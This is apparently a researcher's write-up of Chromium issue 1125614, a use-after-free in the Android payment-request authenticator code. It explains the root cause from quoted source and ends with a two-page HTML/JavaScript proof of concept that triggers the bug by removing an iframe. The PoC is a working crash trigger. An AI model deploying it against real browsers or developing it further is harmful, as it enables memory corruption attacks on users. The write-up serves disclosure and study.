https://bugs.chromium.org/p/chromium/issues/detail?id=1125614
### Root case

```
PaymentAppServiceBridge::PaymentAppServiceBridge(
    size_t number_of_factories,
    content::RenderFrameHost* render_frame_host,
    const GURL& top_origin,
    PaymentRequestSpec* spec,
    const std::string& twa_package_name,
    scoped_refptr<PaymentManifestWebDataService> web_data_service,
    bool may_crawl_for_installable_payment_apps,
    CanMakePaymentCalculatedCallback can_make_payment_calculated_callback,
    PaymentAppCreatedCallback payment_app_created_callback,
    PaymentAppCreationErrorCallback payment_app_creation_error_callback,
    base::OnceClosure done_creating_payment_apps_callback)
    : number_of_pending_factories_(number_of_factories),
      web_contents_(
          content::WebContents::FromRenderFrameHost(render_frame_host)),
      render_frame_host_(render_frame_host),
      top_origin_(top_origin),
      frame_origin_(url_formatter::FormatUrlForSecurityDisplay(
          render_frame_host->GetLastCommittedURL())),
      frame_security_origin_(render_frame_host->GetLastCommittedOrigin()),
      spec_(spec),
      twa_package_name_(twa_package_name),
      payment_manifest_web_data_service_(web_data_service),
      may_crawl_for_installable_payment_apps_(
          may_crawl_for_installable_payment_apps),
      can_make_payment_calculated_callback_(
          std::move(can_make_payment_calculated_callback)),
      payment_app_created_callback_(std::move(payment_app_created_callback)),
      payment_app_creation_error_callback_(
          std::move(payment_app_creation_error_callback)),
      done_creating_payment_apps_callback_(
          std::move(done_creating_payment_apps_callback)) {}
```
在PaymentAppServiceBridge中存储了render_frame_host的指针，它被用于创建InternalAuthenticatorAndroid

```
std::unique_ptr<autofill::InternalAuthenticator>
PaymentAppServiceBridge::CreateInternalAuthenticator() const {
  return std::make_unique<InternalAuthenticatorAndroid>(render_frame_host_);
}
```
InternalAuthenticator将会传递给一个callback作为IsUserVerifyingPlatformAuthenticatorAvailable函数的参数：
```
void SecurePaymentConfirmationAppFactory::Create(
    base::WeakPtr<Delegate> delegate) {
  
  [.......]
  
      std::unique_ptr<autofill::InternalAuthenticator> authenticator =
          delegate->CreateInternalAuthenticator();

      authenticator->IsUserVerifyingPlatformAuthenticatorAvailable(
          base::BindOnce(&SecurePaymentConfirmationAppFactory::
                             OnIsUserVerifyingPlatformAuthenticatorAvailable,
                         weak_ptr_factory_.GetWeakPtr(), delegate,
                         method_data->secure_payment_confirmation.Clone(),
                         std::move(authenticator)));
      return;
    }
  }

  delegate->OnDoneCreatingPaymentApps();
}
```

而在AuthenticatorImpl.java中可以看到
```
    public void isUserVerifyingPlatformAuthenticatorAvailable(
            IsUserVerifyingPlatformAuthenticatorAvailableResponse callback) {
        Context context = ContextUtils.getApplicationContext();
        // ChromeActivity could be null.
        if (context == null) {
            callback.call(false);
            return;
        }

        if (!ChromeFeatureList.isEnabled(ChromeFeatureList.WEB_AUTH)) {
            callback.call(false);
            return;
        }

        if (PackageUtils.getPackageVersion(context, GMSCORE_PACKAGE_NAME)
                < Fido2ApiHandler.GMSCORE_MIN_VERSION) {
            callback.call(false);
            return;
        }

        mIsUserVerifyingPlatformAuthenticatorAvailableCallbackQueue.add(callback);
        Fido2ApiHandler.getInstance().isUserVerifyingPlatformAuthenticatorAvailable(
                mRenderFrameHost, this);
    }
```
回调将会添加到一个回调队列中mIsUserVerifyingPlatformAuthenticatorAvailableCallbackQueue。

此时会存在一个问题，当我们remove掉frame时，并不会影响到mIsUserVerifyingPlatformAuthenticatorAvailableCallbackQueue这个回调队列，这样在之后回调被调用时就会导致UAF

总结一下：

- InternalAuthenticator创建时生命周期同render_frame_host绑定。
- InternalAuthenticator在SecurePaymentConfirmationAppFactory::Create函数中所有权传递给了SecurePaymentConfirmationAppFactory::OnIsUserVerifyingPlatformAuthenticatorAvailable这个回调函数
- 回调函数被加入到了回调队列，并且该队列不会被render_frame_host影响
- destory frame，render_frame_host被释放，InternalAuthenticator被释放，但是在回调队列中他依旧存在，之后回调触发导致uaf。


### poc

```
<html>
  <script>
  function remove() {
    let frame = document.getElementById("ifrm");
    frame.parentNode.removeChild(frame);
  }
  function load() {
    setTimeout(remove, 1000);
  }
  </script>
  <body onload="load()">
    <iframe id="ifrm" src="payment_request2.html"></iframe>
  </body>
</html>


<html>
  <body>
  	<script>
		  var supportedInstruments = [{
			 supportedMethods: 'secure-payment-confirmation',
             data: {'credentialIds' : [new ArrayBuffer(4)], 'fallbackUrl' : 'localhost:8000', 'networkData' : new ArrayBuffer(4),
                    }
			}];

		  var details = {
		    total: {
		      label: 'Total',
		      amount: { currency: 'USD', value : '55.00' }
		    }
		  };
		  var options = {};

          for (let i = 0; i < 0x100; i++) {
      		var request = new PaymentRequest(supportedInstruments, details, options);
          }
  	</script>
  </body>
</html>
```

